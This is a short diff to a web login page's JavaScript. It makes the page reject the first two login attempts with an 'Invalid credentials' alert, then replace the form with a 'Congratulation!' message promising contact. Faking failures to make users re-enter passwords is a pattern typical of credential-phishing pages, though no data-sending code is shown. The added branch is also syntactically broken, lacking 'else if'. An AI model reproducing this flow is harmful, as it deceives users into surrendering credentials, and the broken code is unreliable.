@@ -133,7 +133,11 @@
         // 1st attempt
         alert("Login failed: Invalid credentials");
       } else {
-        // 2nd attempt onwards
+        (loginAttempt === 2) {
+        // 2nd attempt
+        alert("Login failed: Invalid credentials");
+      } else {
+        // 3rd attempt onwards
         const loginBox = document.querySelector('.login-box');
         loginBox.innerHTML = `<h2 style="font-size:28px; color:#1a73e8;">Congratulation!</h2>
                               <p style="font-size:20px; color:#202124;">Our representative will contact you soon.</p>`;
@@ -156,3 +160,4 @@
 
 </body>
 </html>
+
